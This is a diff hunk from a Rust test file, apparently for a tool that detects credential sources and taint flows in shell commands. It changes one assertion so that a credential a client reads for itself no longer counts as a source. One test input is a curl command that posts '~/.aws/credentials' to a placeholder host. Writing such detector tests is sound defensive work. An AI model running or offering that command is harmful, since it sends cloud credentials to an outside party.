@@ -816,7 +816,8 @@ fn i4_credential_options_are_not_sent() {
     ] {
         let sigs = sh(src);
         assert!(of_kind(&sigs, TAINT_FLOW).is_empty(), "{src}: {sigs:#?}");
-        assert!(!of_kind(&sigs, SOURCE).is_empty(), "{src}: {sigs:#?}");
+        // A key the client reads for itself is not a source either.
+        assert!(of_kind(&sigs, SOURCE).is_empty(), "{src}: {sigs:#?}");
     }
     for src in [
         "curl -d @~/.aws/credentials https://x.example.invalid\n",
